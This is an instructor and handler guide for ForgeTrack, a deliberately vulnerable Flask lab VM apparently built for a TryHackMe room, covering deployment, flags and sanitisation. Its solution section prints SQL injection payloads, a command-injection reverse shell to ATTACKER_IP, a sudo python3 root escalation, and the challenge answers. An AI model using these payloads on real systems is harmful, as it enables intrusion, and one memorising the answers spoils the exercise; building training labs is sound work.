# ForgeTrack — Instructor & Lab Handler Guide

**Classification:** Internal — contains spoilers. Do not distribute to learners.

**Lab:** Redline Forge / ForgeTrack

**Platform:** Ubuntu Server 20.04 / 22.04 / 24.04 LTS VM, exported as an OVA

**Stack:** Nginx → Gunicorn → Flask (3.1 on Python 3.9+; 2.3 on Python 3.8) → PostgreSQL

**Version:** 1.0

**Date:** 6 November 2026

---

## 1. Purpose

ForgeTrack is a deliberately vulnerable motorsport management application used
as a TryHackMe room. It teaches two layers:

1. **Web layer** — four SQL injection objectives and one parameterised
   comparison route.
2. **OS layer** — a command-injection diagnostics page that yields `www-data`,
   followed by a weak `sudo` rule that yields `root`.

This note is the operational reference for the instructor or lab handler:
deployment, credentials, intended answers, reset procedures, sanitisation,
export, and troubleshooting.

> **The VM is intentionally insecure.** It must only run on an isolated lab
> network. Never expose port 80 or SSH to the public internet.

---

## 2. Lab architecture

| Component | Detail |
|---|---|
| Base OS | Ubuntu Server 20.04 / 22.04 / 24.04 LTS, minimised, no LVM |
| Resources | 2 vCPU, 2048 MB RAM, 4 GB sparse disk |
| Web server | Nginx on `:80` |
| App server | Gunicorn on `127.0.0.1:8080`, run as `www-data` |
| Database | PostgreSQL on `127.0.0.1:5432` |
| App directory | `/opt/forgetrack` |
| Service | `forgetrack.service` |
| Environment file | `/etc/forgetrack.env` (root:root, `600`) |
| Nginx site | `/etc/nginx/sites-available/forgetrack` |
| Firewall | UFW allows 22/tcp and 80/tcp only |

Request path:

```
player -> nginx :80 -> gunicorn 127.0.0.1:8080 -> postgresql 127.0.0.1:5432
```

PostgreSQL and Gunicorn are **not** externally reachable.

---

## 3. Access and credentials

### 3.1 VM accounts

| Account | Password | Purpose |
|---|---|---|
| `labadmin` | set during Ubuntu installation | SSH/console administration |
| `forge` | locked (`passwd -l`) | decoy account that owns the user flag |
| `root` | locked | use `sudo` from `labadmin` |
| `www-data` | no login shell | web account reached via the exploit |

The handler must record the `labadmin` password used at build time, or reset it
from the VM console:

```bash
sudo passwd labadmin
```

### 3.2 Seeded web accounts

| Username | Password | Role |
|---|---|---|
| `pitwall.27` | `ForgePitwall27!` | Crew — Race Engineer |
| `sora.kade` | `ForgeSoraKade!` | Crew — Workshop Lead |
| `nova.88` | `ForgeNova88!` | Racer — GT Driver |
| `vortex.41` | `ForgeVortex41!` | Racer — Sprint Driver |
| `slipstream.09` | `ForgeSlipstream09!` | Racer — GT Driver |

Crew accounts can access `/garage/manage`, `/drivers/manage`, and
`/team-chat`. Racers receive `403` on crew-only actions. **No challenge
requires a login.**

### 3.3 Database credentials

| Role | Password | Privileges |
|---|---|---|
| `forge_app` | `forge_app_lab_password` | `SELECT/INSERT/UPDATE` in schema `forge` |
| `forge_owner` | `forge_owner_lab_password` | schema owner |
| database | `forgetrack` | — |

`forge_app` has no `DELETE`, no DDL, and no superuser rights.

> These passwords are intentionally weak and are part of the lab. They are not
> a challenge objective. Change them only if your delivery process requires it,
> and update `/etc/forgetrack.env` and `database/init.sql` together.

---

## 4. Deployment

### 4.1 Automated install (recommended)

From the extracted project folder:

```bash
sudo bash install.sh
```

The installer performs:

1. Package installation (nginx, postgresql, python3-venv, ping, ufw, etc.).
2. Copy of the project to `/opt/forgetrack`.
3. Python virtualenv and pinned dependencies.
4. `/etc/forgetrack.env` with a random `SECRET_KEY`.
5. Database creation, schema, and seed data.
6. Ownership and permissions (`root:www-data`, no world access).
7. `forgetrack.service` (Gunicorn as `www-data`).
8. Nginx site and default-site removal.
9. Weak `sudo` rule for `www-data`.
10. `forge` account and both flag files.
11. UFW rules for SSH and HTTP.
12. Smoke tests, including the command-injection check.

Options:

```bash
sudo bash install.sh --reset       # rebuild database and flag files
sudo bash install.sh --no-privesc  # skip the weak sudo rule
sudo bash install.sh --no-flags    # skip user/root flag files
sudo bash install.sh --no-ufw      # do not enable UFW
```

Set the real flags during a reset:

```bash
USER_FLAG='THM{f0rge_us3r_1881f0f3}' ROOT_FLAG='THM{f0rge_r00t_6d28fc4c}' \
  sudo -E bash install.sh --reset
```

### 4.2 Manual install

The full manual procedure is in `docs/vm-build-runbook.md` sections 1–12.

### 4.3 Post-install check

```bash
systemctl is-active nginx postgresql forgetrack
curl -s -o /dev/null -w '%{http_code}\n' http://127.0.0.1/
curl -s --get --data-urlencode 'host=127.0.0.1; id' \
  http://127.0.0.1/diagnostics/ping | grep -o 'uid=[^<]*'
```

Expected: three `active` lines, `200`, and `uid=33(www-data)`.

---

## 5. Intended solution (grading reference)

### 5.1 Answers

| # | Objective | Route | Answer |
|---|---|---|---|
| 1 | Search SQL injection | `/builds/search?query=` | `RFM{search_breach_confirmed}` |
| 2 | UNION record extraction | `/builds/view?id=` | `RFM{the_forge_has_a_hidden_lane}` |
| 3 | Blind boolean inference | `/telemetry/check?session=` | `RFM{telemetry_never_stays_silent}` |
| 4 | Remediation verification | `/secure/builds/search?query=` | `RFM{secure_build_verified}` |
| 5 | User flag | `/home/forge/user.txt` | `THM{f0rge_us3r_1881f0f3}` |
| 6 | Root flag | `/root/root.txt` | `THM{f0rge_r00t_6d28fc4c}` |

\* These are the values baked into the delivered VM; register the same values in the room.

### 5.2 Web challenges

**Challenge 1 — search.** `query` is concatenated inside `ILIKE '%...%'`.
The naive payload fails because `UNION` lands inside the parentheses. Close
them first:

```sql
%' ) UNION SELECT 1,challenge,flag_value,'flag','lab','retrieved' FROM flags WHERE challenge='search' -- 
```

**Challenge 2 — build record.** `id` is concatenated in a numeric context:

```sql
0 UNION SELECT 1,challenge,flag_value,'flag','lab','retrieved' FROM flags WHERE challenge='union' -- 
```

Both routes return six columns: `id, build_code, name, status, car_code,
notes`.

**Challenge 3 — telemetry.** Boolean oracle: HTTP 200 means the row matched,
404 means it did not.

```sql
x' OR (SELECT substring(flag_value,1,1) FROM flags WHERE challenge='blind') = 'R' -- 
```

Extract the value character by character. `_` is a `LIKE` wildcard, so
`substring()` equality is the reliable method.

**Challenge 4 — remediation.** `/secure/builds/search` uses bind parameters.
Replaying the Challenge 1 payload returns zero injected rows. The answer is
`RFM{secure_build_verified}`; if the room requires database retrieval, the same
UNION path with `challenge='remediation'` returns it.

### 5.3 OS foothold

`/diagnostics/ping` passes `host` to `subprocess.check_output(..., shell=True)`.

```bash
curl -sS --get --data-urlencode 'host=127.0.0.1; id' \
  http://VM_IP/diagnostics/ping
```

Expected: `uid=33(www-data)`.

Reverse shell (listener on the attack machine first):

```bash
nc -lvnp 4444

curl -sS --get \
  --data-urlencode "host=127.0.0.1; nohup bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >/dev/null 2>&1 &" \
  http://VM_IP/diagnostics/ping
```

`Connection refused` means no listener. `Temporary failure in name
resolution` means the placeholder IP was not replaced.

### 5.4 Privilege escalation

```bash
sudo -n -l
```

```text
User www-data may run the following commands on redlineforge:
    (root) NOPASSWD: /usr/bin/python3
```

```bash
sudo -n /usr/bin/python3 -c 'import os; os.system("/bin/bash")'
id
cat /root/root.txt
```

Expected: `uid=0(root)`.

A TTY upgrade is optional and cannot use the usual Ctrl-Z method on this VM
because the initial shell has no job control. Use `socat` or `rlwrap` if a
full TTY is required.

---

## 6. Flags

### 6.1 Web flags

The four `RFM{...}` values live in the `flags` table:

```bash
sudo -u postgres psql -d forgetrack -c \
  "SELECT challenge, flag_value FROM forge.flags ORDER BY challenge;"
```

They are seeded by `database/seed.sql`. To change them, edit that file before
delivery, then rebuild:

```bash
sudo bash install.sh --reset
```

### 6.2 OS flags

| File | Owner:group | Mode | Readable by |
|---|---|---|---|
| `/home/forge/user.txt` | `root:www-data` | `640` | `www-data`, root |
| `/root/root.txt` | `root:root` | `400` | root only |

Set or replace them:

```bash
printf '%s\n' 'THM{f0rge_us3r_1881f0f3}' | sudo tee /home/forge/user.txt
sudo chown root:www-data /home/forge/user.txt
sudo chmod 640 /home/forge/user.txt

printf '%s\n' 'THM{f0rge_r00t_6d28fc4c}' | sudo tee /root/root.txt
sudo chmod 400 /root/root.txt
```

Verify as the web account:

```bash
sudo -u www-data cat /home/forge/user.txt      # succeeds
sudo -u www-data cat /root/root.txt            # permission denied
```

### 6.3 Flag hygiene

- The delivered VM uses `THM{f0rge_us3r_1881f0f3}` (user) and
  `THM{f0rge_r00t_6d28fc4c}` (root). Do not re-run the installer without
  passing these values, or the placeholders will be restored.
- Register the same values in the TryHackMe room.
- Rotate web flags per cohort if the room is reused.
- Never ship `database/seed.sql`: it contains every web flag in plaintext.

---

## 7. Pre-delivery verification checklist

- [ ] `systemctl is-active nginx postgresql forgetrack` → three `active`.
- [ ] `http://VM_IP/` returns the ForgeTrack dashboard.
- [ ] `/builds/search` returns normal results for `Apex`.
- [ ] `/builds/view?id=1` renders a record.
- [ ] `/telemetry/check?session=EMB-Q1-07` returns 200; invalid returns 404.
- [ ] `/diagnostics/ping?host=127.0.0.1` shows a ping reply.
- [ ] `host=127.0.0.1; id` returns `uid=33(www-data)`.
- [ ] `sudo -n -l` as `www-data` shows the Python rule.
- [ ] `www-data` can read `/home/forge/user.txt`; cannot read `/root/root.txt`.
- [ ] Both flags are the final values, not placeholders.
- [ ] `/opt/forgetrack/docs`, `database`, `tests`, `scripts`, `output` are removed.
- [ ] `/tmp/redline-forge` and the uploaded ZIP are removed.
- [ ] Shell history is empty for `root` and `labadmin`.
- [ ] No SSH `authorized_keys` remain.
- [ ] VM obtains a DHCP address on boot.
- [ ] OVA is under 3 GB and imports cleanly.

---

## 8. Reset and repair

### 8.1 Re-run the installer

```bash
sudo bash /tmp/redline-forge/install.sh
```

Repairs packages, files, service, Nginx, sudo rule, and flags without dropping
existing data.

### 8.2 Full reset

```bash
sudo bash /tmp/redline-forge/install.sh --reset
```

Drops the database, recreates roles and schema, reloads seed data, and rewrites
the flag files from `USER_FLAG`/`ROOT_FLAG` (or the placeholders).

### 8.3 Manual database reset

```bash
sudo systemctl stop forgetrack

# PostgreSQL 13+ (Ubuntu 22.04/24.04)
sudo -u postgres dropdb --if-exists --force forgetrack

# PostgreSQL 12 (Ubuntu 20.04) has no --force:
sudo -u postgres psql -tAc \
  "SELECT pg_terminate_backend(pid) FROM pg_stat_activity WHERE datname='forgetrack' AND pid <> pg_backend_pid()"
sudo -u postgres dropdb --if-exists forgetrack

sudo -u postgres dropuser --if-exists forge_app
sudo -u postgres dropuser --if-exists forge_owner

sudo -u postgres createdb forgetrack
sudo -u postgres psql -d forgetrack -v ON_ERROR_STOP=1 -f /opt/forgetrack/database/init.sql
sudo -u postgres psql -d forgetrack -v ON_ERROR_STOP=1 -f /opt/forgetrack/database/seed.sql
sudo systemctl start forgetrack
```

### 8.4 Service commands

```bash
sudo systemctl restart forgetrack
sudo journalctl -u forgetrack -n 100 --no-pager
sudo nginx -t && sudo systemctl reload nginx
sudo tail -50 /var/log/nginx/error.log
```

---

## 9. Sanitisation and OVA export

Take a VirtualBox snapshot before cleaning so the build can be recovered.

### 9.1 Remove spoilers

```bash
sudo rm -rf /opt/forgetrack/docs /opt/forgetrack/database \
            /opt/forgetrack/tests /opt/forgetrack/scripts \
            /opt/forgetrack/README.md /opt/forgetrack/docker-compose.yml \
            /opt/forgetrack/.gitignore /opt/forgetrack/output \
            /opt/forgetrack/tmp
sudo find /opt/forgetrack -name '__pycache__' -type d -prune -exec rm -rf {} +
sudo rm -rf /tmp/redline-forge /tmp/redline-forge-lab.zip
```

### 9.2 Clear history and logs

```bash
history -c
rm -f ~/.bash_history ~/.sudo_as_admin_successful ~/.lesshst ~/.viminfo
sudo rm -f /root/.bash_history /root/.psql_history /home/*/.bash_history

sudo journalctl --rotate
sudo journalctl --vacuum-time=1s
sudo find /var/log -type f -exec truncate -s 0 {} +
sudo rm -rf /var/log/installer /var/log/cloud-init* /var/log/unattended-upgrades
sudo rm -f /var/backups/*
```

### 9.3 Reset identity and networking

```bash
sudo truncate -s 0 /etc/machine-id
sudo rm -f /var/lib/dbus/machine-id
sudo ln -s /etc/machine-id /var/lib/dbus/machine-id

sudo rm -f /etc/ssh/ssh_host_*
sudo ssh-keygen -A
sudo rm -f /root/.ssh/authorized_keys /home/*/.ssh/authorized_keys

IFACE=$(ip -br link | awk '$1 != "lo" {print $1; exit}')
sudo rm -f /etc/netplan/*.yaml
sudo tee /etc/netplan/01-lab.yaml >/dev/null <<EOF
network:
  version: 2
  ethernets:
    $IFACE:
      dhcp4: true
EOF
sudo chmod 600 /etc/netplan/01-lab.yaml
sudo netplan apply
```

Do **not** delete `/etc/netplan` entirely; the VM will boot without networking.

### 9.4 Compact

```bash
sudo bash /opt/forgetrack/scripts/compact-vm.sh
sudo rm -rf /opt/forgetrack/scripts
df -h /
```

Expected: 1.6–1.9 GB used. The script removes swap, snapd, `linux-firmware`,
man pages, APT caches, logs, and pip caches, then zeroes free space.

> `compact-vm.sh` deletes `/var/lib/apt/lists`. Do not run `apt update` or
> install packages afterwards; it undoes the saving.

Confirm services still run:

```bash
systemctl is-active nginx postgresql forgetrack
curl -s -o /dev/null -w '%{http_code}\n' http://127.0.0.1/
```

### 9.5 Lock the build account

```bash
sudo passwd -l labadmin
```

### 9.6 Export

Power off, delete all snapshots, then on the host:

```bash
VBoxManage list vms
VBoxManage modifymedium disk "/path/to/ForgeTrack.vdi" --compact
VBoxManage export ForgeTrack --output ForgeTrack.ova
ls -lh ForgeTrack.ova
```

Target: under 3 GB; typically about 1 GB.

### 9.7 Import test

Import the OVA into a clean VM, boot it, and repeat section 7. This is the only
test that proves the delivered artefact works.

---

## 10. Troubleshooting

| Symptom | Cause | Fix |
|---|---|---|
| `502 Bad Gateway` | Gunicorn down | `journalctl -u forgetrack -n 50` |
| `500` on every page | PostgreSQL unreachable | `systemctl status postgresql`; check `DATABASE_URL` |
| `0 matching records` on UNION | `UNION` still inside `(...)` | close with `%' )` |
| `/diagnostics` 404 | blueprint missing | ensure `app/lab_diagnostics.py` exists and is registered |
| `ping: command not found` | `iputils-ping` missing | `apt install -y iputils-ping` |
| Injection returns `uid=1000(...)` | app started as a user, not `www-data` | run via `forgetrack.service` |
| `sudo -n -l` asks for password | weak rule missing | re-run `install.sh` |
| Reverse shell `Connection refused` | no listener | start `nc -lvnp 4444` first |
| Reverse shell name-resolution error | `ATTACKER_IP` not replaced | use the real IP |
| Page unreachable from host | firewall or NAT | `ufw allow 80/tcp`; add a VirtualBox port forward for NAT |
| VM has no network after import | netplan deleted | restore `01-lab.yaml` from section 9.3 |
| OVA too large | swap or snapshots remain | remove swap, delete snapshots, re-run compaction |

---

## 11. File map

| Path | Purpose |
|---|---|
| `install.sh` | one-command installer |
| `app/app.py` | Flask routes, including the SQLi lab routes |
| `app/lab_diagnostics.py` | intentionally vulnerable ping endpoint |
| `app/templates/` | UI templates |
| `app/static/img/cars/` | seven local car images plus attribution |
| `database/init.sql` | roles, schema, tables, grants |
| `database/seed.sql` | seed data and the four web flags |
| `scripts/compact-vm.sh` | trim script run before export |
| `docs/vm-build-runbook.md` | manual end-to-end build |
| `docs/vm-compact-build.md` | size budget and trimming |
| `docs/room-walkthrough.md` | full learner walkthrough (spoilers) |
| `docs/handler-guide.md` | this document |
| `output/redline-forge-lab.zip` | transfer bundle for the VM |

**Do not copy `docs/`, `database/`, `tests/`, or `scripts/` into the delivered
VM.**

---

## 12. Handling rules

1. Run only on an isolated host-only, NAT, or bridged lab network.
2. Never expose the VM to the internet or a production network.
3. Do not reuse the seeded passwords outside the lab.
4. Keep this guide and `docs/room-walkthrough.md` off the VM.
5. Rotate flags between cohorts if the room is reused.
6. Re-import and re-test the OVA after any change.
7. Treat the VM as disposable: rebuild from `install.sh` rather than repairing
   a compromised instance.

---

## 13. Change log

| Date | Change |
|---|---|
| 2026-11-06 | Initial handler guide |
| 2026-11-04 | Added diagnostics foothold and weak sudo rule |
| 2026-11-04 | Replaced car images with verified local assets |
